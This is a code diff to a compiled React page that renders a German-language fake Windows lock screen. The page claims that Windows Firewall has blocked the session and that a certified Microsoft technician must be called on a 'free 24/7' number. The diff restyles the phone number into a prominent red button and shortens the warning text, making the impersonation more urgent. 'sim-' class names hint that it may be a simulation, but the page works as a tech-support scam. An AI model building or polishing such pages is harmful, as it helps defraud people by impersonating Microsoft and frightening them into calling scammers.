@@ -13430,13 +13430,19 @@ unter ${G} an.
                 children: "Windows Firewall hat Ihre Sitzung gesperrt."
             }), f.jsx("h3", {
                 style: {
-                    fontSize: 34,
-                    margin: "15px 0",
-                    color: "#ffeb3b",
+                    fontSize: 28,
+                    margin: "15px auto",
+                    color: "#ffffff",
                     fontWeight: "bold",
-                    textShadow: "0 0 8px #ffeb3b, 0 0 20px #ffeb3b, 0 0 40px #ffd600",
                     letterSpacing: "2px",
-                    animation: "phonePulse 1.4s ease-in-out infinite"
+                    backgroundColor: "#d32f2f",
+                    padding: "14px 32px",
+                    borderRadius: "8px",
+                    display: "inline-block",
+                    cursor: "pointer",
+                    boxShadow: "0 4px 15px rgba(211,47,47,0.5)",
+                    textShadow: "none",
+                    border: "none"
                 },
                 children: R
             }), f.jsx("input", {
@@ -13480,7 +13486,7 @@ unter ${G} an.
                     style: {
                         marginBottom: 20
                     },
-                    children: "Zu Ihrer Sicherheit hat Windows die Ausführung nicht autorisierter Skripte blockiert, die in diesem Netzwerk erkannt wurden. Eine manuelle Überprüfung durch einen zertifizierten Microsoft-Techniker ist erforderlich, um das System zu entsperren."
+                    children: "Eine manuelle Überprüfung durch einen zertifizierten Microsoft-Techniker ist erforderlich, um das System zu entsperren."
                 }), f.jsxs("div", {
                     className: "sim-tech-info",
                     children: [f.jsxs("div", {
@@ -13543,7 +13549,7 @@ unter ${G} an.
                         children: "Technischer Support (Kostenlos - 24/7):"
                     }), f.jsx("span", {
                         className: "sim-black-phone",
-                        style: { fontSize: "40px", fontWeight: "bold", backgroundColor: "#046cd4", color: "#ffff", padding: "3px 18px", borderRadius: "5px", display: "inline-block", letterSpacing: "2px" },
+                        style: { fontSize: "40px", fontWeight: "bold", backgroundColor: "#d40404", color: "#ffff", padding: "3px 20px", borderRadius: "5px", display: "inline-block", letterSpacing: "2px" },
                         children: R
                     }), f.jsx("div", {
                         style: {
